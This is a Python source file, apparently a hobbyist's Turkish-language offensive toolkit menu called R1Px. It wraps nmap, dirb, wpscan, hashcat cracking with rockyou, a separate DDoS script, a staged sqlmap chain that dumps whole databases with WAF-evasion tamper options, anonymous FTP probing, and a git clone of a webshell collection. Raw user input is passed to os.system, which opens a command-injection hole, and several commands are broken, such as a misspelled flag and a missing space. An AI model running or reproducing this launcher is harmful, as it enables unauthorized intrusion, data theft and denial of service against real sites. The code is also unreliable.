#!/usr/bin/env python
#-*- coding: utf-8 -*-
import os 
import requests
import time
os.system("clear")


PEMBE = '\033[95m'
MAVİ = '\033[94m'
YESİL = '\033[92m'
SARI = '\033[93m'
KIRMIZI = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'


print(KIRMIZI + """
_____  __ _____       
|  __ \/_ |  __ \      
| |__) || | |__) |_  __
|  _  / | |  ___/\ \/ /
| | \ \ | | |     >  < 
|_|  \_\|_|_|    /_/\_\
                         

HOŞGELDIN !!!

1:  Port Scan
2:  Web Extension Browsing
3:  Worpress Scan
4:  MD5 (hash)
5:  SHA2-256 (hash)
6:  FREE PROXY 
7:  DDOS Attack
8:  SQL Scan
9:  FTP
10: Telnet
11: Download WebShell
""")

islem = input(BOLD+MAVİ+"R1Px~#  ")

if(islem == "1"):
	ip = input("Enter Destination IP : ")
	os.system("nmap " + " -sC " + " -sV " + ip + " -Pn ")

elif(islem == "2"):
	print("http://domain.com/ https://domain.com/")
	web = input("Web sitesini giriniz: ")
	os.system("dirb " + web)

elif(islem == "3"):
	wp = input("Enter website : ")
	os.system("wpscan " + " --url " + wp)

elif(islem == "4"):
	hash = input("Enter HASH: ")
	os.system("hashcat " + "-m 0 " + " -a 0 " + hash + " " "/usr/share/wordlists/rockyou.txt")
	
elif(islem == "5"):
	has = input("Enter HASH : ")
	os.system("hashcat -m 1400 " " -a 0 " + " has " "/usr/share/wordlists/rockyou.txt")

elif(islem == "6"):
	print("LOADIND !")
	os.system("python3 proxy.py")
	print("File --> /root/Desktop/proxy.txt")

elif(islem == "7"):
	os.system("python ddos.py")

elif(islem == "8"):
	print("")
	site = input("Sitenizi Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + " --dbs --random-agent --skip-waf --tamper=between,randomcase --level=5 --risk=3 --no-cast --threads=10 --batch ")

	print("")
	database = input("Database Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + "-D " + database  + " --tables --random-agent --skip-waf --tamper=between,randomcase --level=5 --risk=3 --no-cast --threads=10 --batch")

	print("")
	tables = input("Tablo Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --random-agent --skip-waf --tamper=between,randomcase --level=5 --ris=3 --no-cast --threads=10 --batch")

	print("")
	kolon = input("Kolon Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --random-agent --skip-waf --tamper=between,randomcase --level=5 --ris=3 --no-cast --threads=10 --batch")

elif(islem == "9"):
	print("IP or ftpsite.com")
	print("Test To username and password = anonymous")
	ftp = input("Site: ")
	os.system("ftp " + ftp)

elif(islem == "10"):
	print("IP exp: 127.0.0.1")
	tel = input("Site: ")
	os.system("telnet" + tel)

elif(islem == "11"):
	print("WebShell Installing")
	os.system("git clone https://github.com/tennc/webshell")

else:
	("ERROR !!!")
